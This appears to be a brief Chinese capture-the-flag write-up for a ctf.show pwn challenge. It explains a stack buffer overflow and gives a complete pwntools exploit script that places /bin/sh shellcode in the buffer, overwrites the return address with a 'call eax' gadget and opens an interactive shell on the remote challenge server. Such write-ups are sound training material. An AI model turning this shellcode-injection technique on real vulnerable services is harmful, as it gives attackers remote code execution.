# 挑战简介
你需要注意某些函数，这是解题的关键！

# 思路
相对简单的一道题，只是写入一个sh再折返回去执行罢了，通过栈溢出，进入可执行的区间，再写入sh

这时通过gdb发现eax指向buf，寻找call eax的指令再调用即可  

```
from pwn import *
from LibcSearcher import *
import base64
context(arch="i386", log_level="debug")

p = remote("pwn.challenge.ctf.show",28222)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.i386.linux.sh())

offset = 0x208 + 4

call_eax = 0x080484a0

p.recvuntil('input: ')

payload1 = shellcode.ljust(offset, b"a") + p32(call_eax) 

p.sendline(payload1)

p.interactive()
```
